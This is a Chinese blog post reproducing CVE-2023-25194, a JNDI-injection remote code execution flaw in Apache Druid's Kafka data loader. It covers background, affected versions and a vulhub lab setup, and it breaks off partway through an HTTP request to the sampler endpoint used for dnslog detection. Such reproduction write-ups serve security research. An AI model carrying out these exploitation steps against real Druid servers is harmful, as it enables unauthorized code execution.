# Apache Druid RCE 漏洞复现及修复(CVE-2023-25194) - 那酒不要留 - 博客园

> 原文：[`www.cnblogs.com/xiaoyunxiaogang/p/17469403.html`](https://www.cnblogs.com/xiaoyunxiaogang/p/17469403.html)

Apache Druid RCE 漏洞复现及修复(CVE-2023-25194)

2023-03-16

| **声明：本文分享的安全工具和项目均来源于网络，漏洞环境本地搭建，仅供安全研究与学习，****如用于其他用途，由使用者承担全部法律及连带责任，与工具作者和本公众号无关。** |

瓜神学习网络安全本公众号记录网络安全学习笔记公众号 **产品简介**

 Apache Druid 是一个高性能的实时大数据分析引擎，支持快速数据摄取、实时查询和数据可视化。它主要用于 OLAP（在线分析处理）场景，能处理 PB 级别的数据。Druid 具有高度可扩展、低延迟和高吞吐量的特点，广泛应用于实时监控、事件驱动分析、用户行为分析、网络安全等领域。通过使用 Druid，企业和开发者可以快速获得实时分析结果，提升决策效率。

**漏洞简介**

在 Apache Druid 使用 Apache Kafka 加载数据的场景下，未经身份认证的远程攻击者可配置 Kafka 连接属性，从而利用 CVE-2023-25194 漏洞触发 JNDI 注入，最终执行任意代码。（其他使用 Apache Kafka Connect 的产品也可能受 CVE-2023-25194 漏洞影响）

**影响范围**

*   0.19.0 <= Apache Druid <= 25.0.0

**危害级别****：****高**

*   CVE-2023-25194 

    # QVD-2023-9629

**漏洞复现**

**安装环境-docker 部署**

用的 github 的 vulhub： 

```
https://github.com/vulhub/vulhub/blob/master/kafka/CVE-2023-25194/README.zh-cn.md
```

执行如下命令启动一个 Apache Druid 25.0.0 服务，其内部使用的 kafka-clients 版本是 3.3.1：

```
[root@VM-4-17-centos CVE-2023-25194]# docker-compose up -dStarting cve202325194_web_1 ... done[root@VM-4-17-centos CVE-2023-25194]#
```

服务启动后，访问`http://your-ip:8888`即可查看到 Apache Druid 主页。

![](img/f26bba32fcb4c384238607b0c9587a84.png)

 **复现步骤******1、检测：****访问漏洞环境：

![](img/2ccc04ec3bf9e5a42429baa55f60c560.png)

![](img/1743f0cc00426d307b4de6030d231711.png)

 ![](img/489ee0cc7591ede7546fcdee6ade2d76.png)抓包

![](img/00c312ab6145e348e76cb4281f2d7af6.png)

****dnslog 检测：****

```
POST /druid/indexer/v1/sampler?for=connect HTTP/1.1Host: vps:8888Content-Length: 1400Accept: application/json, text/plain, */*User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36Content-Type: application/jsonOrigin: http://vps:8888Referer: http://vps:8888/unified-console.htmlAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: pZaf_2132_ulastactivity=050484OuqAxDqETcOja26QKgFkE4HbrlSk4NbAkGRg9oNLIbkCUN; pZaf_2132_nofavfid=1; pZaf_2132_smile=1D1; pZaf_2132_home_readfeed=1682214968; pZaf_2132_lastviewtime=1%7C1682215445; pZaf_2132_lastcheckfeed=1%7C168221781
```